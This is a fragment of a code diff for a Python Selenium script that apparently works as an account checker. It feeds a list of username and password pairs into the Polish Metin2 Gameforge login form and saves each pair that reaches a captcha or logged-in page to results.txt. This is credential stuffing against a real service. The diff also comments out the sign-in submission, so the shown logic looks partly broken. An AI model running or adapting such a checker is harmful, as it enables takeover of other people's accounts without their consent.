@@ -57,21 +57,22 @@ for credential in credentials:
 
     browser.get(('https://pl.metin2.gameforge.com'))
 
-    username = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'username')))
+    current_url = browser.current_url
+
+    
+    username = WebDriverWait(browser, 30).until(EC.presence_of_element_located((By.NAME, 'username')))
     username.send_keys(usernameStr)
-    password = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'password')))
+    password = WebDriverWait(browser, 30).until(EC.presence_of_element_located((By.NAME, 'password')))
     password.send_keys(passwordStr)
 
     current_url = browser.current_url
     signInButton = None
 
-    if current_url == 'https://pl.metin2.gameforge.com': 
-        signInButton = WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, 'submitBtnRight')))
-        signInButton.submit()
-       
-    WebDriverWait(browser,15).until(EC.url_changes(current_url))
-    current_url = browser.current_url
+    # signInButton = WebDriverWait(browser, 40).until(EC.element_to_be_clickable((By.ID, 'submitBtnRight')))
+    # signInButton.submit()
 
+    current_url = browser.current_url
+  
     if current_url == 'https://pl.metin2.gameforge.com/captcha' or  'https://pl.metin2.gameforge.com/main/index?__token=' in current_url:
         saveCredntialResultToFile(credential,"results.txt")
     browser.quit()
